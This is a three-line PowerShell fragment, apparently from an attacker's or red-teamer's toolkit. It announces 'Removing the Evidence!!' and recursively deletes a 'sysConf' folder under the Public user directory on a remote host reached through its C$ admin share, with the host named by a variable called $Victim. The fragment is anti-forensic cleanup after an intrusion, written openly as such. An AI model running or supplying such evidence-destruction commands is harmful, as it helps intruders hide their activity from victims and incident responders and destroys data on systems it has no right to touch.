﻿Write-Output 'Removing the Evidence!!'
rm -R \\$Victim\c$\Users\Public\sysConf
Write-Output 'Done'